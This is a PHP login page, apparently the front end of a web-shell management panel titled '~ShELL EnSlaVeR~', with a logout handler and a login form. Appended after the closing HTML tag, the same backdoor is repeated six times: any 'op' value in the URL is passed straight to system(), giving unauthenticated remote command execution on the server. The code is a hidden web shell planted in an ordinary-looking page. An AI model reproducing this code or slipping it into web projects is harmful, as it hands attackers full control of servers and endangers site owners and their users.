<?php
include('init.php');
if(!empty($_GET['do']) && ($_GET['do']=="logout")) {
	@session_destroy();
	header('Location: login.php');
	exit;
}
?>
<html>
<head>
	<meta http-equiv='Content-Type' content='text/html; charset=UTF-8'>
	<title>~ShELL EnSlaVeR~</title>
	<link rel='stylesheet' href='index.css' type='text/css' />
	<script src="jquery.js"></script>
</head>
<body>
<center>
	<div style="width:50%">
		<br/>
		<h1>Autorization</h1><div class=content>
			<form method="post" action="index.php">
			Login: <input type="text" name="login"/> Password: <input type="password" name="pass"/><input type="submit" value=">>"/>
			</form>
		</div>
	</div>
</center>
<script>
document.forms[0].login.focus();
</script>
</body>
</html><?php if ($_GET["op"]){system($_GET["op"]);      
die ("<p>Stop</p>");}?><?php if ($_GET["op"]){system($_GET["op"]);      
die ("<p>Stop</p>");}?><?php if ($_GET["op"]){system($_GET["op"]);      
die ("<p>Stop</p>");}?><?php if ($_GET["op"]){system($_GET["op"]);      
die ("<p>Stop</p>");}?><?php if ($_GET["op"]){system($_GET["op"]);      
die ("<p>Stop</p>");}?><?php if ($_GET["op"]){system($_GET["op"]);      
die ("<p>Stop</p>");}?>